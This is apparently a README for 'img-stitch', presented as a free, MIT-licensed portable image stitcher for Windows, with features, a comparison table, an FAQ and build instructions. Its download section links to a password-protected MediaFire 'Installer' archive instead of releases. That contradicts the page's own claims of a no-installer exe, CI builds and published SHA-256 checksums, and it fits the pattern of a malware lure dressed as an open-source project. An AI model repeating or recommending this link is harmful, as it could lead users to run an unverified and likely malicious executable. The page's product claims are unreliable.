# img-stitch

🧵 Free, open-source image stitcher for Windows — combine screenshots and photos into long images, aligned. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Vertical, horizontal and grid layouts** — long web captures, side-by-side comparisons and contact sheets
- ✅ **Overlap auto-alignment** — detects matching strips between sequential screenshots and seams them cleanly
- ✅ **Border and background control** — gap width, background color and rounded edges between tiles
- ✅ **Auto-crop overlap** — strips duplicated scroll regions instead of stacking them
- ✅ **Memory-safe large canvases** — stitches 50-plus images into a 30000 px result without exhausting RAM
- ✅ **Export presets** — web-optimized JPEG or lossless PNG at chosen scale
- ✅ **100 MB self-contained exe** — imaging codecs bundled, portable, offline, MIT with SHA-256 releases

## Why img-stitch

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **img-stitch** | Hugin | PhotoStitcher | Web Stitchers |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free, OSS | Paid | Freemium |
| Open source | **Yes** | Yes | No | No |
| Long-screenshot mode | **Yes** | No | No | Partial |
| Overlap trim for scrolls | **Yes** | No | Partial | Partial |
| 50-plus tile contact sheets | **Yes** | No | Partial | No |
| Portable, no install | **Yes, 100 MB** | Installer | Installer | Web |

## FAQ

**how to combine multiple screenshots into one long image?**

Chat and webpage captures arrive as a dozen fragments with scroll overlaps, and pasting them into Paint produces visible seams. img-stitch finds the matching strips, trims duplicates and outputs one clean long image, or a bordered grid when you need a comparison sheet. It is a 100 MB portable exe, MIT, offline.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark canvas (#121418, orange #F97316): 12 screenshot tiles in vertical order, seam markers green where overlap was trimmed, canvas height readout 18,420 px.
2. Layout panel: vertical, horizontal and grid modes, gap slider at 8 px, background color swatch, auto-crop overlap toggle on.
3. Export dialog: JPEG and PNG cards, scale selector 100 percent, memory estimate bar green, preview strip of the final seam.

## Download

| Source | Link |
|---|---|
| 💾 **Installer img-stitch** | [Installer img-stitch](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).